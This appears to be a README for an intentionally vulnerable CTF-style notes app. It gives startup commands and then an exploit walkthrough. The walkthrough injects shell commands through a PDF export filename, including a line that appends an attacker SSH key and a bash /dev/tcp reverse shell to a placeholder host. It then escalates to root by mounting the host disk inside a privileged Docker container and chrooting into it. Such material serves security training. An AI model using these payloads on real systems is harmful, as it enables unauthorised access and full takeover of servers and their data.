
# Startup

To start up the app, first ensure `uv` is installed and then run the following commands.

```
uv sync
uv run python app.py
```

# Exploit

## User Access

User access: the idea is that the attacker adds their public SSH key or spawn a reverse shell.
`https://gtfobins.org/gtfobins/bash/#reverse-shell`

The attacker should realize that there is a pdf export feature to export all the notes of a user.
After a bit of experimenting they should figure out that the filename allows for command injection by for example sending:
```py
l           # just gives you a pdf named l
l; sleep 5  # gives you a pdf named l after 5 seconds of sleep
```
Now they should try to establish a reverse shell to the server using the approach outlined in https://gtfobins.org/gtfobins/bash/#reverse-shell
First they should name sure to have netcat or similiar listening on some port and then give this to the export:
```py
# Add a public SSH key
l; echo -n "KEY" >> ~/.ssh/authorized_keys
# Or spawn a reverse shell
l; bash -c 'exec bash -i &>/dev/tcp/ip/port <&1'
```
This will give access to the user the webserver is running as.

## Root Access

Once user access has been acquired, the attacker can escalate by exploiting how Docker is configured.

Docker is running as a root process and the user running the webserver is apart
of the docker group which allows them to run docker commands without a
password.

This means that it is possible for the attacker to spawn a privileged Docker
container, mount the root of the system into the container and then chroot into
the system.

```bash
docker run --rm -it --privileged -u root alpine
mount /dev/vda3 /mnt/
chroot /mnt /bin/bash
```

